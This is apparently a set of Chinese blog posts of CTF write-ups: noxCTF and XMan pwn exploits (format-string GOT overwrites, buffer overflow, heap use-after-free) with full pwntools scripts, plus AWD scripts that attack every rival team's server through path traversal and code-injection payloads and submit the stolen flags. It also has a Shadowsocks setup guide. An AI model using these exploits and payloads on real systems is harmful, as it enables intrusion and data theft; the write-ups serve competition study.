main函数中对字符串长度做了限制，并且存在明显的格式化字符串漏洞。然后很容易发现有一个奇怪的函数noxFlag： 12345678910111213141516171819202122232425void __noreturn noxFlag()&#123; char i; // [esp+Bh] [ebp-Dh] FILE *stream; // [esp+Ch] [ebp-Ch] stream = fopen(\"flag.txt\", \"r\"); puts(s); fflush(stdout); if ( stream ) &#123; for ( i = fgetc(stream); i != -1; i = fgetc(stream) ) &#123; putchar(i); fflush(stdout); &#125; fflush(stdout); fclose(stream); &#125; else &#123; puts(\"Can't read file \\n\"); fflush(stdout); &#125; exit(0);&#125; 由于题目中提到环境是不开启ASLR的，那么这道题的思路就很明确：通过格式化字符串，泄漏出main函数ret的地址，修改为noxFlag的地址，得到flag.txt的内容。 gdb调试，通过查看栈上的内容得到\b\b字符串的offset： 1234567891011gdb-peda$ stack 200000| 0xffffceb0 --&gt; 0xffffced4 (&quot;AAAA&quot;)0004| 0xffffceb4 --&gt; 0x804890c --&gt; 0xa (&apos;\\n&apos;)0008| 0xffffceb8 --&gt; 0xf7fb35a0 --&gt; 0xfbad2288 0012| 0xffffcebc --&gt; 0x7f17 0016| 0xffffcec0 --&gt; 0xffffffff 0020| 0xffffcec4 --&gt; 0x2f (&apos;/&apos;)0024| 0xffffcec8 --&gt; 0xf7e0ddc8 --&gt; 0x2b76 (&apos;v+&apos;)0028| 0xffffcecc --&gt; 0xffffcfb4 --&gt; 0xffffd18d (&quot;/home/assassinq/Desktop/pwn/format string/noxCTF-believeMe/believeMe&quot;)0032| 0xffffced0 --&gt; 0x8000 0036| 0xffffced4 (&quot;AAAA&quot;) 关于ret的地址，也通过在栈上的观察： 1234567890084| 0xffffce94 --&gt; 0xffffceb0 --&gt; 0x1 0088| 0xffffce98 --&gt; 0x0 0092| 0xffffce9c --&gt; 0xf7e19637 (&lt;__libc_start_main+247&gt;: add esp,0x10)0096| 0xffffcea0 --&gt; 0xf7fb3000 --&gt; 0x1b1db0 --More--(25/50)0100| 0xffffcea4 --&gt; 0xf7fb3000 --&gt; 0x1b1db0 0104| 0xffffcea8 --&gt; 0x0 0108| 0xffffceac --&gt; 0xf7e19637 (&lt;__libc_start_main+247&gt;: add esp,0x10)0112| 0xffffceb0 --&gt; 0x1 可以看到本地\bret的地址即为0xffffceac，然后需要利用漏洞，泄漏出远程的地址。仔细观察发现offset为84和112处的联系，即只需要泄漏出offset为84的\b内容，再将结果减去4即能\b得到远程服务器上ret的地址。 格式化字符串漏洞的payload还可以利用pwntools中的一个函数fmtstr_payload，用于自动生成格式化字符串。fmtstr_payload有三个参数：第一个参数是int，用于表示取参数的偏移个数；第二个参数是字典，字典的意义是往key的地址，写入value的值；第三个参数write_size，可以改变payload的形式，\bbyte对应%hhn，short对应%hn，int对应%n。 最后可以写出exp： 12345678910111213141516171819from pwn import *# context.log_level = 'DEBUG'local = 0if local: p = process('./believeMe')else: p = remote('18.223.228.52', 13337)flag_addr = 0x0804867Bret_addr = 0xffffdd2c # local: 0xffffd2bcoffset = 9# payload = p32(0xdeadbeef) + '%&#123;&#125;$p'.format(str(offset)) # test offset# payload = '0x%21$08x' # test ret_addr# payload = p32(ret_addr + 2) + p32(ret_addr) + '%2044c%9$hn%32375c%10$hn'payload = fmtstr_payload(offset, &#123;ret_addr:flag_addr&#125;, write_size='short')assert(len(payload) &lt; 39)p.recvuntil('????')# gdb.attach(p, 'b *0x80487d3\\nc')p.sendline(payload)p.interactive() PWN-The Name Calculator\b又是一道格式化字符串，还涉及到栈溢出。\b先反编译查看main函数： 12345678910111213141516171819202122int __cdecl __noreturn main(int argc, const char **argv, const char **envp)&#123; char buf; // [esp+Ch] [ebp-2Ch] int v4; // [esp+28h] [ebp-10h] unsigned int v5; // [esp+2Ch] [ebp-Ch] v5 = __readgsdword(0x14u); puts(\"What is your name?\"); fflush(stdout); read(0, &amp;buf, 0x20u); fflush(stdin); if ( v4 == 0x6A4B825 ) &#123; secretFunc(); &#125; else &#123; puts(\"I've heard better\"); fflush(stdout); &#125; exit(0);&#125; 查看一下v4和buf在内存中的位置，发现可以溢出进入secretFunc，看一下这个函数： 123456789101112131415161718192021222324252627282930313233int secretFunc()&#123; unsigned int v0; // eax int *i; // [esp+8h] [ebp-40h] ssize_t v3; // [esp+18h] [ebp-30h] int buf[7]; // [esp+20h] [ebp-28h] unsigned int v5; // [esp+3Ch] [ebp-Ch] void *retaddr; // [esp+4Ch] [ebp+4h] v5 = __readgsdword(0x14u); v0 = 0; do &#123; buf[v0] = 0; ++v0; &#125; while ( v0 &lt; 7 ); retAddr = (int)retaddr; puts(\"Say that again please\"); fflush(stdout); v3 = read(0, buf, 0x1Bu); *((_BYTE *)buf + v3) = 0; fflush(stdin); for ( i = buf; i &lt; (int *)((char *)&amp;buf[-1] + v3); i = (int *)((char *)i + 1) ) *i ^= 0x5F7B4153u; puts(\"Your name was encrypted using the best encryption in the world\"); printf(\"This is your new name: \"); printf((const char *)buf); fflush(stdout); if ( retaddr != (void *)retAddr ) exit(1); return 0;&#125; 中间对输入的buf进行了异或，从第一字符开始，步长为1，每次取\b四个字符，\b转换为int型\b后与特定数字异或，循环直到倒数第四个字符。后面buf这里的\bprintf明显存在格式化字符串。\b然后又发现了一个superSecretFunc函数： 123456int superSecretFunc()&#123; printf(\"Here is your flag: \"); fflush(stdout); return system(\"cat flag\");&#125; 大概知道了是通过格式化字符串修改某个ret的地址\b，然后在superSecretFunc这里执行\bcat flag。回头再看到main函数调用了exit，这里就可以通过修改exit的got表实现跳转。然后先通过gdb调试找到\b地址： 12345678gdb-peda$ pdis exitDump of assembler code for function exit@plt: 0x08048470 &lt;+0&gt;: jmp DWORD PTR ds:0x804a024 0x08048476 &lt;+6&gt;: push 0x30 0x0804847b &lt;+11&gt;: jmp 0x8048400End of assembler dump.gdb-peda$ x/wx 0x804a0240x804a024: 0x08048476 查看栈上分布，得到\b字符串的偏移： 123456789101112130000| 0xffbc27e0 --&gt; 0xffbc2810 --&gt; 0xa0a (&apos;\\n\\n&apos;)0004| 0xffbc27e4 --&gt; 0xffbc2810 --&gt; 0xa0a (&apos;\\n\\n&apos;)0008| 0xffbc27e8 --&gt; 0x1b 0012| 0xffbc27ec --&gt; 0xf75badfb (&lt;_IO_puts+347&gt;: add esp,0x10)0016| 0xffbc27f0 --&gt; 0xf75c31d7 (&lt;_IO_new_file_sync+7&gt;: add esi,0x149e29)0020| 0xffbc27f4 --&gt; 0xf770d000 --&gt; 0x1b1db0 0024| 0xffbc27f8 --&gt; 0xffbc2810 --&gt; 0xa0a (&apos;\\n\\n&apos;)0028| 0xffbc27fc --&gt; 0x804879a (&lt;main+112&gt;: jmp 0x80487bd &lt;main+147&gt;)0032| 0xffbc2800 (&quot;SA&#123;_&quot;)0036| 0xffbc2804 --&gt; 0x0 0040| 0xffbc2808 --&gt; 0x2 0044| 0xffbc280c --&gt; 0xf770d000 --&gt; 0x1b1db0 0048| 0xffbc2810 --&gt; 0xa0a (&apos;\\n\\n&apos;) 最后\b的exp： 123456789101112131415161718192021222324252627282930313233from pwn import *# context.log_level = 'DEBUG'local = 1if local: p = process('./CAL')else: p = remote('chal.noxale.com', 5678)def xor_op(s): xor_num = 0x5F7B4153 l = list(s) for i in range(len(l) - 4): t = ''.join(l[i:i + 4]) l[i:i + 4] = list(p32(u32(t) ^ xor_num)) return ''.join(l)offset1 = 28v4 = 0x6A4B825offset2 = 12exit_got = 0x804a024super_addr = 0x08048596# gdb.attach(p, 'b *0x8048656')p.recvuntil('name?')payload1 = 'A' * offset1 + p32(v4)p.send(payload1)p.recvuntil('please')payload2 = xor_op(p32(exit_got) + '%34194c%12$hn')assert(len(payload2) &lt; 0x1B)p.send(payload2)p.interactive() 参考网站https://github.com/OAlienO/CTF/tree/master/2018/noxCTF/Guess-The-Stringhttps://github.com/imthoe/noxCTF/tree/master/BlindDatehttps://www.pwndiary.com/write-ups/noxctf-2018-believeme-write-up-pwn378/https://www.pwndiary.com/write-ups/noxctf-2018-the-name-calculator-write-up-pwn537/","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://qianfei11.github.io/tags/ctf/"},{"name":"wp","slug":"wp","permalink":"https://qianfei11.github.io/tags/wp/"}]},{"title":"利用VPS搭建Shadowsocks科学上网","slug":"利用VPS搭建Shadowsocks科学上网","date":"2018-09-08T03:37:55.000Z","updated":"2018-09-24T10:35:13.984Z","comments":true,"path":"2018/09/08/利用VPS搭建Shadowsocks科学上网/","link":"","permalink":"https://qianfei11.github.io/2018/09/08/利用VPS搭建Shadowsocks科学上网/","excerpt":"记录一下自己搭小飞机的过程。","text":"记录一下自己搭小飞机的过程。 第一步-租服务器先放一些国外的一些VPS提供商：vultr、linode、搬瓦工。我是在vultr上租的服务器。 首先注册账号，进入\b个人界面后，在Billing页面使用Alipay充值。 去Servers页面，\b选择服务器的地点，我选了Los Angeles。 然后选择os，我的话选了CentOS。 然后Size我是选了$3.5/mo，因为最便宜的$2.5/mo只支持ipv6。 然后点击Deploy Now，过一会儿就可以得到这台服务器的基本信息。 第二步-ssh远程连接mac的话我是用的SSH Shell来连，如果是windows可以用Putty。 按照给出的信息连一下就行了（\b端口22）。 第三步-搭建\b在服务器上运行一下命令： 123wget --no-check-certificate -O shadowsocks-all.sh https://raw.githubusercontent.com/teddysun/shadowsocks_install/master/shadowsocks-all.shchmod +x shadowsocks-all.sh./shadowsocks-all.sh 2&gt;&amp;1 | tee shadowsocks-all.log 然后按照提示选择脚本，我选了Shadowsocks-Go，之后\b也是无脑跟着指令一步一步进行，安装完成后就会得到\b： 12345678910111213141516Starting shadowsocks-go (via systemctl): [ OK ]Congratulations, Shadowsocks-Go server install completed!Your Server IP : xxx.xxx.xxx.xxxYour Server Port : xxxxxYour Password : xxxxxxxxxxx Your Encryption Method: xxxxxxxxxxxYour QR Code: (For Shadowsocks Windows, OSX, Android and iOS clients) ss://YWVzLTI1Ni1jZmI6dGVkZHlzdW4uY29tQDE0OS4yNDguNC4yMjg6MTIyOTk=Your QR Code has been saved as a PNG file path: /root/shadowsocks_go_qr.pngWelcome to visit: https://teddysun.com/486.htmlEnjoy it! 第四步-科学上网我把\b每个平台上的小飞机都放在我的github上了。\b只要将上面的信息填进去就能科学上网啦。 参考网站https://www.diycode.cc/topics/738","categories":[],"tags":[{"name":"note","slug":"note","permalink":"https://qianfei11.github.io/tags/note/"}]},{"title":"2018-安恒杯八月月赛-review","slug":"【未完成】2018-安恒杯八月月赛-review","date":"2018-08-31T14:34:15.000Z","updated":"2019-01-22T12:50:55.071Z","comments":true,"path":"2018/08/31/【未完成】2018-安恒杯八月月赛-review/","link":"","permalink":"https://qianfei11.github.io/2018/08/31/【未完成】2018-安恒杯八月月赛-review/","excerpt":"放暑假玩了几天，慢慢整理这几次比赛。","text":"放暑假玩了几天，慢慢整理这几次比赛。 CRYPTO-爬坡道提示明显是希尔加密，了解一下希尔加密写一下脚本或者在线解密。 123456789101112131415161718192021from numpy import *flag = ''mat_key = mat([[3, 1], [2, 1]])enc = 'mttpjbpexfdzcegtdzeanutg'# pla = 'thehillisveryinteresting'# 字符串转为数字enc1 = []for i in range(len(enc)): enc1.append(ord(enc[i]) - ord('a'))# 计算明文并转化为字符串res = mat_enc * mat_key.Ires = res.reshape(1, len(enc1)).tolist()[0]flag = ''for i in range(len(res)): flag += chr(ord('a') + (int(round(res[i])) % 26))# 输出flagprint flag 最后提交flag的md5值。 RE-Dig The Way题目里直接给了一个idb文件，用ida打开分析。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364int __cdecl main(int argc, const char **argv, const char **envp)&#123; unsigned int v3; // eax int result; // eax int v5; // eax char flag; // [esp+11h] [ebp-3Fh] int a[0]; // [esp+28h] [ebp-28h] int a[2]; // [esp+30h] [ebp-20h] int a[4]; // [esp+38h] [ebp-18h] int a[5]; // [esp+3Ch] [ebp-14h] signed int (__cdecl *_func0)(char *, int, int); // [esp+40h] [ebp-10h] int (__cdecl *_func1)(char *, int, int); // [esp+44h] [ebp-Ch] int (__cdecl *_func2)(char *, int, int); // [esp+48h] [ebp-8h] int i; // [esp+4Ch] [ebp-4h] __main(); _func0 = swap; // swap pos _func1 = trans1; // |x + y| - |x| - |y| + 2 _func2 = trans2; // |x| + |y| - |x + y| + 2 v3 = 0; do &#123; *(int *)((char *)&amp;a[0] + v3) = 0; // init array v3 += 4; &#125; while ( v3 &lt; 24 ); printf(\"input flag:\"); scanf(\"%s\", &amp;flag); if ( strcmp(&amp;flag, \"flag&#123;\") &lt; 0 ) // 1.flag head return 0; if ( check(&amp;flag) ) // 2.flag all-misc &#123; a[5] = getValue(&amp;flag); if ( a[5] &gt; 0 ) // make sure only one solution &#123; for ( i = 0; i &lt;= 2; ++i ) &#123; v5 = (*(&amp;_func0 + i))((char *)&amp;a[0], 4, 5); *(&amp;a[0] + i) = v5; a[5] = -a[4]; &#125; if ( a[2] ) // 3.flag key-point &#123; result = 1; &#125; else &#123; puts(\"Congratulations\"); system(\"PAUSE\"); result = 0; &#125; &#125; else &#123; result = 0; &#125; &#125; else &#123; puts(\"check your flag!\"); result = 0; &#125; return result;&#125; 一开始对输入字符串匹配了flag{，之后有多个函数进行的转换。可以看出最重要的有三个函数： check() getValue() _func2 下面就逐一分析。 check()1234567891011121314bool __cdecl check(_BYTE *a1)&#123; if ( (char)a1[7] + (char)a1[6] != (char)a1[8] ) return 0; if ( (char)a1[10] + (char)a1[9] != (char)a1[11] ) return 0; if ( (char)a1[13] + (char)a1[12] != (char)a1[14] ) return 0; if ( (char)a1[16] + (char)a1[15] != (char)a1[17] ) return 0; if ( (char)a1[19] + (char)a1[18] == (char)a1[20] ) return (a1[8] ^ (unsigned __int8)(a1[11] ^ a1[14] ^ a1[17] ^ a1[21])) == a1[5]; return 0;&#125; 通过这个函数大概可以得到几个字符得到的方式，显然这里用z3是很难求解的。 getValue()12345678910int __cdecl getValue(char *a1)&#123; signed int i; // [esp+8h] [ebp-8h] int v3; // [esp+Ch] [ebp-4h] v3 = 0; for ( i = 6; i &lt;= 19; i += 3 ) v3 = 100 * v3 + 10 * (a1[i] - 48) + a1[i + 1] - 48; return v3;&#125; 从第六位开始，每次取三位，每三位取前两位组成数字v3并返回。 _func21234567int __cdecl trans2(char *a1, int i, int j)&#123; return abs(*(_DWORD *)&amp;a1[4 * j]) - abs(*(_DWORD *)&amp;a1[4 * j] + *(_DWORD *)&amp;a1[4 * i]) + abs(*(_DWORD *)&amp;a1[4 * i]) + 2;&#125; 简化为|x| + |y| - |x + y| + 2，根据main函数中的逻辑，该值应该为0。但又因为|x| + |y| &gt;= |x + y|，故|x| + |y| - |x + y| + 2 &gt; 0，无法使之为0。 下面开始对程序逆向分析： 由于第三个函数很难得到0，可以想到溢出方面，使返回值为0x100000000。x与y的值又因为互为相反数，可以求出|x|和|y|的值，而y在内存中的表示即为x的补码。得到x为2147483647，y为2147483649。 通过x的值和getValue函数倒推出一部分flag：flag{x21x47x48x36x47（x为未知部分）。 根据check函数，写个脚本跑出大部分flag：flag{x21c47k48l36i47k。 最后还有一部分由于不知道第21位flag，猜测应该是}了，通过check函数异或后得到：flag{p21c47k48l36i47k} MISC-暴力可解8位的数字暴力破解得到zip密码。 先试着用stegsolve把两张图合并无果，猜测是盲水印，用工具BlindWaterMark，命令为python bwm.py 1.png 2.png flag.png，最后得到flag。 PWN-Unote2初步判断题目应该是和堆相关，打开idb文件。 发现在delete函数处free掉指针后没有情况，产生了uaf（use after free）： 123456if ( ptr[v1] ) // uaf&#123; free(*((void **)ptr[v1] + 1)); free(ptr[v1]); puts(\"Success\");&#125; add函数申请一个8byte大小的结构体，存放函数指针和note的内容，函数指针指向一个打印函数： 12345678int __cdecl print_string(char *s)&#123; size_t v1; // eax v1 = strlen(s); printf(\"length :%zu\\ncontent :\", v1); return puts(s);&#125; \b借鉴一叶飘零师傅的exp如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364from pwn import *context.log_level = 'debug'context.arch = 'i386'local = 1if local: p = process('./note') elf = ELF('./note') libc = ELF('/home/assassinq/Desktop/pwn/heap/AHB-note/libc-2.23.so')else: p = remote('101.71.29.5', 10001) elf = ELF('./note') libc = ELF('/home/assassinq/Desktop/pwn/heap/AHB-note/libc-2.23.so')def d(a=''): gdb.attach(p, a) if a == '': raw_input()def add(size, con): p.sendline('1') p.recvuntil('Note size :') p.send(str(size)) p.recvuntil('Content :') p.send(con)def dele(idx): p.sendline('2') p.recvuntil(\"Index :\") p.send(str(idx))def show(idx): p.send('3') p.recvuntil(\"Index :\") p.send(str(idx))add(0x20, 'A')add(0x20, 'B')add(0x20, 'C')dele(1)dele(0)# d('b *0x08048691\\nc')add(0x8, p32(0x804865B) + p32(elf.got['puts']))show(1)p.recvuntil(\"content :\")leak = p.recv(4)libc.address = u32(leak) - libc.symbols['puts']log.info(\"libc_base:0x%x\" % libc.address)dele(3)add(0x8, p32(libc.symbols['system']) + p32(libc.search('/bin/sh').next()))show(1)p.interactive() 先申请三个note，malloc了6\b个chunk： 123&apos;A&apos; 0x10 byte + size + 0x10 byte&apos;B&apos; 0x10 byte + size + 0x10 byte&apos;C&apos; 0x10 byte + size + 0x10 byte 再free掉两个note： 1head --&gt; &apos;A&apos; 0x10 --&gt; &apos;B&apos; 0x10 然后再申请一个note，也就是把之前已经free了的chunk重新分配回来了，可以leak出libc地址。最后再伪造一个fake note，\bshow的时候就调用了system，成功getshell。 流量分析相对系统地学习了一下wireshark的使用和流量分析。 前置知识 过滤IP： ip.src eq x.x.x.x or ip.dst eq x.x.x.x ip.addr eq x.x.x.x 过滤端口： tcp.port eq 80 or udp.port eq 80 过滤MAC eth.dst == A0:00:00:04:C5:84 http模式过滤： http.request.method == &quot;GET&quot; http.request.method == &quot;POST&quot; http.request.uri == &quot;/img/logo-edu.gif&quot; http contains &quot;GET&quot; http contains &quot;HTTP/1.&quot; http.request.method == &quot;GET&quot; &amp;&amp; http contains &quot;User-Agent:&quot; webone.pcap协议分级发现大部分为http，重点关注对话的80端口，基本可以确定黑客的地址。 黑客使用的扫描器 扫描器很容易发现： 或者可以用http contains查找常用的几种扫描器。 黑客扫描到的登陆后台 1http.request.method == &quot;POST&quot; 得知黑客使用了awvs后再次筛选可以找到登录后台： 黑客登陆web后台使用的账号密码 1http.request.method == &quot;POST&quot; and ip.src == 192.168.94.59 and http contains &quot;rec=login&quot; 黑客上传的webshell内容的base编码 1http.request.method == &quot;POST&quot; and ip.src == 192.168.94.59 and http contains &quot;eval&quot; 即将@eval($_POST[&#39;1234&#39;])base64加密后提交。 黑客在robots.txt中找到的flag 1http contains &quot;Disallow&quot; 黑客找到的数据库密码 1http contains &quot;web&quot; and http contains &quot;password&quot; 被黑客攻击的web服务器网卡内网ip 1http contains &quot;eth&quot; webtwo.pcap 黑客在数据库中找到的hash_code 1mysql contains &quot;hash_code&quot; 黑客破解账号ijnu@test.com得到的密码 1mysql contains &quot;ijnu@test.com&quot; 找到密码后md5解密： mailtwo.pcap &amp;&amp; mailtwo1.pcap 黑客登陆mail系统使用的账号 可以社工，直接用web的账号密码。 正经做法是先在mailtwo.pcap中找到加密算法： 1234var key_hash = CryptoJS.MD5('1234567812345678');var key = CryptoJS.enc.Utf8.parse(key_hash);var iv = CryptoJS.enc.Utf8.parse('1234567812345678');form.password.value = CryptoJS.AES.encrypt(form.password.value, key, &#123; iv: iv,mode:CryptoJS.mode.CBC,padding:CryptoJS.pad.ZeroPadding&#125;) 在mailtwo1.pcap中再过滤： 1(http contains &quot;&#123;\\&quot;success\\&quot;:true&#125;&quot; or http.request.method == &quot;POST&quot;) and ip.addr == 192.168.94.59 找到被加密的密码： 最后根据算法和已被加密的密码得到明文密码。 vpnone.pcap &amp;&amp; vpntwo.pcapvpnone.pcap在尝试登陆vpn，vpntwo.pcap成功登陆了vpn。 黑客获得的vpn、ip 在统计-&gt;端点中流量最大的为黑客ip。 参考网站： http://foreversong.cn/archives/216http://skysec.top/2018/08/25/2018%E5%AE%89%E6%81%928%E6%9C%88%E8%B5%9BWriteup/","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://qianfei11.github.io/tags/ctf/"},{"name":"review","slug":"review","permalink":"https://qianfei11.github.io/tags/review/"}]},{"title":"2018-XMan结营赛-review","slug":"2018-XMan结营赛-review","date":"2018-08-22T09:39:54.000Z","updated":"2019-02-24T13:38:35.830Z","comments":true,"path":"2018/08/22/2018-XMan结营赛-review/","link":"","permalink":"https://qianfei11.github.io/2018/08/22/2018-XMan结营赛-review/","excerpt":"记录一下被虐的经历。","text":"记录一下被虐的经历。 全队就我一个菜鸡维护二进制，全场被痛打，很难受。记录一下线下AWD所需要做的准备，以及两道pwn的复现。 准备第一次打AWD，什么也不懂。 比赛前了解比赛赛制、环境。 服务器上线之后，第一时间改密码。 下载好FileZilla、Xshell等连接服务器的工具，把服务器上给的文件备份。 提前准备好自动化的脚本。 这里放一下队友web大佬的打全场脚本： 12345678910111213141516171819202122232425from requests import getfrom os import systemfor i in range(24): if i == 12: continue print(f\"======&#123;i+1&#125; starts=======\") url = f\"http://172.16.&#123;i+1&#125;.101:20001/uploads/images/../../../../../../../flag\" try: flag = get(url).text[:-1] system(f'curl http://172.16.200.20:9000/submit_flag/ -d \"flag=&#123;flag&#125;&amp;token=Hn4JuwQQ7Mfaek2HAuTkB3S6k4e38EKXQJEdtDDWDfsda2tqQUgUHRCtrtxbS9hMkQndVbVfHsD\"') print(f\"\\n&#123;flag&#125;\") except: print(f\"&#123;i+1&#125; : no\") pass url = f\"http://172.16.&#123;i+1&#125;.101:20001/category/test?0=%28function%28%29%7b%0a%20%20%20%20var%20fs%20%3d%20require%28%27fs%27%29%3b%0a%09var%20flag%20%3d%20fs.readFileSync%28%27%2fflag%27%2c%20%27utf-8%27%29%3b%0a%09fs.writeFileSync%28%27%2fhome%2fxctf%2fweb%2fstatic%2fjs%2ftest.js%27%2c%20flag%29%3b%0a%09return%201%3b%0a%7d%29%28%29%3b\" try: get(url) url = f\"http://172.16.&#123;i+1&#125;.101:20001/static/js/test.js\" flag = get(url).text flag = get(url).text[:-1] system(f'curl http://172.16.200.20:9000/submit_flag/ -d \"flag=&#123;flag&#125;&amp;token=Hn4JuwQQ7Mfaek2HAuTkB3S6k4e38EKXQJEdtDDWDfsda2tqQUgUHRCtrtxbS9hMkQndVbVfHsD\"') print(f\"\\n&#123;flag&#125;\") except: pass 1234567891011121314151617181920212223242526272829303132from requests import postfrom pyquery import PyQuery as pqfrom os import systemfor i in range(24): if i == 8: continue print(f\"======&#123;i+1&#125; starts=======\") if i == 12 or i == 2: continue payloads = [ \"@assert($_POST[cmd])\", \"@assert($_POST[cmd])\", \"@call_user_func(assert, $_POST[cmd])\", \"print(file_get_contents(chr(47).chr(102).chr(108).chr(97).chr(103)))\" ] for p in payloads: url = \"http://172.16.\" + str(i+1) + \".102:20002/?r=list&amp;pages=123&#123;$&#123;\" + p + \"&#125;&#125;123\" t = post(url, data=&#123;'cmd' : 'system(\"/bin/cat /flag\");'&#125;).text try: d = pq(t) out = d('.pagecode').html() print(out) flag = out.split(';')[-2].split('\\n')[1] if i==16: flag = flag[2:] print(f\"&#123;i+1&#125; : &#123;flag&#125;\") system(f'curl http://172.16.200.20:9000/submit_flag/ -d \"flag=&#123;flag&#125;&amp;token=Hn4JuwQQ7Mfaek2HAuTkB3S6k4e38EKXQJEdtDDWDfsda2tqQUgUHRCtrtxbS9hMkQndVbVfHsD\"') print('\\n') except: print(f\"&#123;i+1&#125; not avai\") pass 复现全场贡献只有成功patch了最容易的第二题。 once_timechecksec： 123456[*] '/home/assassinq/Desktop/once_time' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) 拖进ida，main函数： 123456789101112131415unsigned __int64 __fastcall main(__int64 a1, char **a2, char **a3)&#123; char s; // [rsp+0h] [rbp-20h] char v5; // [rsp+8h] [rbp-18h] unsigned __int64 v6; // [rsp+18h] [rbp-8h] v6 = __readfsqword(0x28u); setbuf(); printf(\"input your name: \", a2); memset(&amp;s, 0, 9uLL); read(0, &amp;s, 9uLL); v5 = 0; printf(\"wellcome :%s\\n\", &amp;s); return vul();&#125; 另一个关键函数： 1234567891011121314151617unsigned __int64 vul()&#123; char s; // [rsp+0h] [rbp-20h] unsigned __int64 v2; // [rsp+18h] [rbp-8h] v2 = __readfsqword(0x28u); printf(\"leave a msg: \"); memset(&amp;s, 0, 0x10uLL); read(0, &amp;s, 0x20uLL); if ( strstr(&amp;s, \"%p\") || strstr(&amp;s, \"$p\") ) &#123; puts(\"do you want to leak info?\"); exit(0); &#125; printf(&amp;s, \"$p\"); return __readfsqword(0x28u) ^ v2;&#125; vul()中read(0, &amp;s, 0x20uLL);处存在buffer overflow，又因为开了Canary，需要想办法绕过；printf(&amp;s, &quot;$p&quot;);处存在format string，可以实现任意地址的读和写。 首先将__stack_chk_fail的got表改成main函数的地址，那么这样每次栈溢出报错的时候就会再一次执行main函数，从而实现多次输入，可以多次利用printf(&amp;s，&quot;$p&quot;);进行格式化字符串攻击； 泄漏libc的基址，这里用泄漏read函数的真实地址来实现； 将one_gadget写入exit()函数的got表中。 12345670008| 0x7fffffffdc10 (&quot;BBBBBBBB\\n&quot;) ; 第二次输入0016| 0x7fffffffdc18 --&gt; 0xa (&apos;\\n&apos;)0024| 0x7fffffffdc20 --&gt; 0x0 0032| 0x7fffffffdc28 --&gt; 0x8e2d258951a85400 0040| 0x7fffffffdc30 --&gt; 0x7fffffffdc60 --&gt; 0x400a20 (push r15)0048| 0x7fffffffdc38 --&gt; 0x400a08 (mov rcx,QWORD PTR [rbp-0x8])0056| 0x7fffffffdc40 (&quot;AAAAAAAA&quot;) ; 第一次输入 调试出来可以看到第一次输入位于第二次输入后的第六个参数，64位下偏移就是12。为了达到触发__stack_chk_fail的目的，我们还需要覆盖掉Canary，位于第二次输入后的第三个参数处，故至少需要输入大于24个字符。read总共读0x20个字符，我们这里也就读0x20个，以触发__stack_chk_fail。 第二步利用read的got表将libc基址泄漏出来。然后在已知libc版本的情况下，第三步将exit的got表覆盖成one_gadget。最后送个%p或者$p上去getshell。exp如下： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192#!/usr/bin/env python#coding=utf-8from pwn import *# context.log_level = 'debug'context.arch = 'amd64'p = process('./once_time')elf = ELF('./once_time')libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')one_gadget_offset = 0xf1147info('&gt;&gt;&gt; REPLACE __stack_chk_fail WITH main &lt;&lt;&lt;')main = 0x400983stack_chk_fail_got = elf.got['__stack_chk_fail']p.recvuntil('input your name: ')p.sendline(p64(stack_chk_fail_got))p.recvuntil('leave a msg: ')payload = '%&#123;&#125;c%12$n'.format(str(main))payload = payload.ljust(0x20, '\\x00')print repr(payload)p.send(payload)info('&gt;&gt;&gt; LEAK libc &lt;&lt;&lt;')read_got = elf.got['read']p.recvuntil('input your name: ')p.sendline(p64(read_got))p.recvuntil('leave a msg: ')payload = '%12$s'payload = payload.ljust(0x20, '\\x00')print repr(payload)p.send(payload)data = p.recvuntil('\\x7f')print u64(data[-6:].ljust(8, '\\x00'))read_offset = libc.symbols['read']libc_base = u64(data[:6].ljust(8, '\\x00')) - read_offset# libc.address = read - read_offsetsuccess('libc_base = ' + hex(libc_base))one_gadget = libc_base + one_gadget_offsetsuccess('one_gadget = ' + hex(one_gadget))info('&gt;&gt;&gt; FMTSTR ATTACK &lt;&lt;&lt;')info('FIRST WORD')info(hex(one_gadget &amp; 0xFFFF))exit_got = elf.got['exit']p.recvuntil('input your name: ')p.sendline(p64(exit_got))p.recvuntil('leave a msg: ')payload = '%&#123;&#125;c%12$hn'.format(str(one_gadget &amp; 0xFFFF))#取最低的双字节并对齐payload = payload.ljust(0x20, '\\x00')print repr(payload)p.send(payload)info('SECOND WORD')info(hex((one_gadget &gt;&gt; 16) &amp; 0xFFFF))p.recvuntil('input your name: ')p.sendline(p64(exit_got + 2))p.recvuntil('leave a msg: ')payload = '%&#123;&#125;c%12$hn'.format(str((one_gadget &gt;&gt; 16) &amp; 0xFFFF))payload = payload.ljust(0x20, '\\x00')print repr(payload)p.send(payload)info('THIRD WORD')info(hex((one_gadget &gt;&gt; 32) &amp; 0xFFFF))p.recvuntil('input your name: ')p.sendline(p64(exit_got + 4))p.recvuntil('leave a msg: ')payload = '%&#123;&#125;c%12$hn'.format(str((one_gadget &gt;&gt; 32) &amp; 0xFFFF))payload = payload.ljust(0x20, '\\x00')print repr(payload)p.send(payload)info('FOURTH WORD')info(hex((one_gadget &gt;&gt; 48) &amp; 0xFFFF))p.recvuntil('input your name: ')p.sendline(p64(exit_got + 6))p.recvuntil('leave a msg: ')if (one_gadget &gt;&gt; 48) &amp; 0xFFFF != 0: payload = '%&#123;&#125;c%12$hn'.format(str((one_gadget &gt;&gt; 48) &amp; 0xFFFF))else: payload = '%12$hn'payload = payload.ljust(0x20, '\\x00')print repr(payload)p.send(payload)p.recvuntil('input your name: ')p.sendline('root')p.recvuntil('leave a msg: ')p.sendline('%p')p.recvuntil('\\n')success('&gt;&gt;&gt; PWNED BY ASSASSINQ &lt;&lt;&lt;')p.interactive() messageboard这题大佬们都用堆做，然而我一点都不会。后来神仙pizza给了一种format string的超简单做法。 123456[*] '/home/assassinq/Desktop/messageboard' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled 拖进ida里，典型的堆题的形式，这里只看第四个选项： 123456789101112131415161718192021222324252627282930313233unsigned __int64 getshell()&#123; int fd; // ST04_4 __int64 v2; // [rsp+8h] [rbp-58h] __int128 v3; // [rsp+28h] 